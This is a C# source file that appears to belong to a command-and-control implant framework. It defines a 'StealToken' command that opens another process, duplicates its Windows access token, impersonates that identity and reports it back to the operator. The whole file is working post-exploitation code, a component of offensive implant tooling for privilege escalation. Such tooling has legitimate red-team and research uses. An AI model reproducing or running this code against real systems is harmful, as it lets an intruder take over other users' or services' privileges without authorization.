using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

using DInvoke.Data;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public sealed class StealToken : DroneCommand
{
    public override byte Command => 0x2B;
    public override bool Threaded => false;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var pid = uint.Parse(task.Arguments[0]);

        var hProcess = IntPtr.Zero;
        var status = NtOpenProcess(pid,
            (uint)(PROCESS_ACCESS_FLAGS.PROCESS_QUERY_INFORMATION | PROCESS_ACCESS_FLAGS.PROCESS_DUP_HANDLE),
            ref hProcess);

        if (status != Native.NTSTATUS.Success)
        {
            Drone.SendTaskError(task.Id, "Failed to open process handle.");
            return;
        }

        var hToken = OpenProcessToken(hProcess, TOKEN_ACCESS.TOKEN_QUERY | TOKEN_ACCESS.TOKEN_DUPLICATE);

        if (hToken == IntPtr.Zero)
        {
            CloseHandle(hProcess);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        var hTokenDup = DuplicateTokenEx(hToken,
            DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
            SECURITY_IMPERSONATION_LEVEL.SECURITY_IMPERSONATION,
            TOKEN_TYPE.TOKEN_IMPERSONATION);

        CloseHandle(hProcess);
        CloseHandle(hToken);

        if (hTokenDup == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        RevertToSelf();

        if (!ImpersonateToken(hTokenDup))
            throw new Win32Exception(Marshal.GetLastWin32Error());

        using var identity = new WindowsIdentity(hTokenDup);
        Drone.SendTaskOutput(task.Id, $"Impersonated token for {identity.Name}.");
        Drone.ImpersonationToken = hTokenDup;
    }
}